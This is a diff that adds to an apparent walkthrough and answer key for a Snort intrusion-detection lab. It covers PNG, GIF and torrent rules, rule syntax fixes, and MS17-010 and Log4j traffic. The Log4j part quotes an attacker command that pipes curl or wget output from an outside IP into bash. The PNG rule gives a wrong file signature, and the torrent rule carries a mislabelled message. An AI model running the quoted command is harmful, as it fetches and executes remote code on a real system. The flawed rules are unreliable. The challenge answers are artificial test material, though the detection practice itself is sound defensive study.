@@ -57,10 +57,58 @@ The number of such login attempts detected by snort is `7`. <br />
 
 ### Writing IDS Rules (PNG)
 
+- Write a rule to detect the PNG file in the given pcap. Investigate the logs and identify the software name embedded in the packet. <br />
+To find the png file we first need to search it's [hexadecimal signature](https://en.wikipedia.org/wiki/List_of_file_signatures) to be able to identify it. The final rule should look something like this:
+
+      alert tcp any any <> any any (msg:"PNG file Detected"; content:"|89 50 4A 47 0D 0A 1A 0A|"; sid:100002; rev:1;)
+Now run `snort -r snort.log.1724508168 -d` to find the content of the packet: 
+![image](https://github.com/user-attachments/assets/45d22586-5822-4b11-b915-d2bf7b629042)<br />
+The software is `Adobe ImageReady`<br />
+
+- Write a rule to detect the GIF file in the given pcap. Investigate the logs and identify the image format embedded in the packet.
+The process is similar as before but now we need to look for the hexadecimal signature of GIF, which is `47 49 46 38 39`.
+![image](https://github.com/user-attachments/assets/287b054d-f273-452c-adb8-7e960219ca7f) <br />
+The format is `GIF89a`. <br />
+
 ### Writing IDS Rules (Torrent Metafile)
 
+- Write a rule to detect the torrent metafile in the given pcap. <br />
+The rule to add here is very intuitive:
+
+      alert tcp any any <> any any (msg:"PNG file Detected"; content:"torrent"; sid:100002; rev:1;)
+Snort detecs 2 packets using this rule. The answer to the following questions can be easily found in the content of the packets. <br />
+- What is the number of detected packets? `2`. <br />
+
+- What is the name of the torrent application? `bittorrent` <br />
+- What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile? `application/x-bittorrent` br />
+- What is the hostname of the torrent metafile? `tracker2.torrentbox.com` <br />
+
 ### Troubleshooting Rule Syntax Errors
+In this section we need to fix the syntax error in local-X.rules files and make them work smoothly. Each answer will correspond to the number of detected packets using the newly corrected rule. Let's start: <br />
+1) `16` <br />
+2) `68` <br />
+3) `87` <br />
+4) `90` <br />
+5) `155` <br />
+6) `2` <br />
+7) `msg` <br />
 
 ### Using External Rules (MS17-010)
+Moving on to TASK-7: <br />
+- Use the given rule file (local.rules) to investigate the ms1710 exploitation. What is the number of detected packets? `25154` <br />
+- Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets? `12`<br />
+- What is the requested path? `\\192.168.116.138\IPC$` <br />
+- What is the CVSS v2 score of the MS17-010 vulnerability? After some quick OSINT, the answer can be easily found: `9.3` <br />
 
 ### Using External Rules (Log4j)
+By now we should be able to complete each task without explicitly explaining every step: 
+- Use the given rule file (local.rules) to investigate the log4j exploitation. What is the number of detected packets? `26` <br />
+- How many rules were triggered? `4`<br />
+- What are the first six digits of the triggered rule sids? `210037`<br />
+- What is the number of detected packets? `41`<br />
+- What is the name of the used encoding algorithm? `Base64`<br />
+- What is the IP ID of the corresponding packet? `62808`<br />
+- What is the attacker's command? `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`<br />
+- What is the CVSS v2 score of the Log4j vulnerability? `9.3`<br /><br />
+
+bye :)
